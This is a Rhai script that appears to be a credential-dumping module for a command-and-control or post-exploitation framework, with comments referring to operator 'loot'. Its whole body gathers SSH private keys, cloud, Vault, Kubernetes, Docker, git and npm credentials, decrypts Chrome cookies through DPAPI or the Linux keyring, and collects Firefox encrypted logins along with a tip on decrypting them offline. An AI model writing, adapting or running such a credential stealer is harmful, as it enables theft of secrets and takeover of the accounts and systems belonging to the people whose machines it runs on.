// cred_dump.rhai - full credential sweep.
//
// One pass over every credential source the scripting API exposes:
//   files   : ssh private keys, ~/.aws, ~/.vault-token, ~/.kube/config,
//             ~/.docker/config.json, ~/.git-credentials, ~/.npmrc
//   browser : Chrome cookies (DPAPI on Windows, keyring AES on Linux),
//             Firefox logins.json (NSS ciphertext, offline decrypt)
//
// Windows-only decryptions are OS-gated and say so in the output; missing
// files are reported as absent, never as empty secrets. Output is a single
// JSON document on stdout (lands in the Jobs panel / history for loot).

fn esc(s) {
    let r  = s.replace("\\", "\\\\");
    let r2 = r.replace("\"", "\\\"");
    let r3 = r2.replace("\n", "\\n");
    return r3.replace("\r", "\\r");
}

// Present-or-empty: readers return "Error: ..." when the file is absent.
fn present(s) {
    return !s.starts_with("Error:") && s != "";
}

let is_windows = internal_env("SystemRoot").contains("Windows");
let sysinfo    = internal_sysinfo_json();
let hostname   = internal_json_get(sysinfo, "hostname");
let os         = internal_json_get(sysinfo, "os_release");

print_log("cred_dump: sweeping credential locations");

// ── 1. Existence sweep ───────────────────────────────────────────────
let sweep = internal_credential_sweep();

// ── 2. Well-known credential files ───────────────────────────────────
let files = "[";

// SSH private keys (array of {path, key_type, content})
let ssh = internal_ssh_keys("");
if files != "[" { files += ","; }
if ssh.starts_with("Error:") {
    files += "{\"name\":\"ssh_keys\",\"present\":false}";
} else {
    let rows = "[";
    let n = 0;
    let i = 0;
    loop {
        let p = internal_json_get(ssh, i + ".path");
        if p == "null" { break; }
        if n > 0 { rows += ","; }
        rows += "{\"path\":\"" + esc(p) + "\",\"key_type\":\"" + internal_json_get(ssh, i + ".key_type") +
                "\",\"content\":\"" + esc(internal_json_get(ssh, i + ".content")) + "\"}";
        n += 1;
        i += 1;
    }
    rows += "]";
    files += "{\"name\":\"ssh_keys\",\"present\":" + (n > 0) + ",\"count\":" + n + ",\"rows\":" + rows + "}";
}

// Single-content readers: [label, content]
let aws    = internal_aws_credentials();
let aws_c  = internal_json_get(aws, "credentials");
let aws_g  = internal_json_get(aws, "config");
let simple = [
    ["aws_credentials", aws_c],
    ["aws_config",      aws_g],
    ["vault_token",     internal_vault_token()],
    ["kube_config",     internal_kube_config()],
    ["docker_config",   internal_docker_config()],
    ["git_credentials", internal_git_credentials()],
    ["npm_token",       internal_npm_token()],
];
for entry in simple {
    if files != "[" { files += ","; }
    let label = entry[0];
    let body  = entry[1];
    if present(body) {
        files += "{\"name\":\"" + label + "\",\"present\":true,\"content\":\"" + esc(body) + "\"}";
    } else {
        files += "{\"name\":\"" + label + "\",\"present\":false}";
    }
}
files += "]";

// ── 3. Chrome cookies ────────────────────────────────────────────────
print_log("cred_dump: chrome cookies");
let chrome = "{\"present\":false}";
let cjs = internal_chrome_cookies("");
if !cjs.starts_with("Error:") {
    let rows = "[";
    let n = 0;
    let dec = 0;
    let i = 0;
    loop {
        let host = internal_json_get(cjs, i + ".host");
        if host == "null" { break; }
        let enc = internal_json_get(cjs, i + ".encrypted_value");
        let plain = "";
        if enc != "null" && enc != "" {
            if is_windows {
                let r = internal_dpapi_decrypt(enc, "");
                if !r.starts_with("Error:") {
                    let t = internal_hex_decode(r);
                    if !t.starts_with("Error:") { plain = t; dec += 1; }
                }
            } else {
                let t = internal_chrome_decrypt_linux(enc);
                if !t.starts_with("Error:") { plain = t; dec += 1; }
            }
        }
        if n > 0 { rows += ","; }
        rows += "{\"host\":\"" + esc(host) + "\",\"name\":\"" + esc(internal_json_get(cjs, i + ".name")) +
                "\",\"value\":\"" + esc(internal_json_get(cjs, i + ".value")) +
                "\",\"decrypted\":\"" + esc(plain) + "\"}";
        n += 1;
        i += 1;
    }
    rows += "]";
    chrome = "{\"present\":true,\"cookies\":" + n + ",\"decrypted\":" + dec + ",\"rows\":" + rows + "}";
}

// ── 4. Firefox logins ────────────────────────────────────────────────
print_log("cred_dump: firefox logins");
let firefox = "{\"present\":false}";
let fjs = internal_firefox_logins("");
if !fjs.starts_with("Error:") {
    let rows = "[";
    let n = 0;
    let i = 0;
    loop {
        let host = internal_json_get(fjs, "logins." + i + ".hostname");
        if host == "null" { break; }
        if n > 0 { rows += ","; }
        rows += "{\"host\":\"" + esc(host) +
                "\",\"encrypted_username\":\"" + internal_json_get(fjs, "logins." + i + ".encryptedUsername") +
                "\",\"encrypted_password\":\"" + internal_json_get(fjs, "logins." + i + ".encryptedPassword") + "\"}";
        n += 1;
        i += 1;
    }
    rows += "]";
    firefox = "{\"present\":true,\"logins\":" + n +
              ",\"note\":\"NSS-encrypted; decrypt offline with firefox_decrypt and the profile key4.db\",\"rows\":" + rows + "}";
}

print_log("cred_dump: sweep complete");
return "{\"hostname\":\"" + esc(hostname) + "\",\"os\":\"" + esc(os) +
       "\",\"windows\":" + is_windows +
       ",\"sweep\":" + sweep +
       ",\"files\":" + files +
       ",\"chrome\":" + chrome +
       ",\"firefox\":" + firefox + "}";
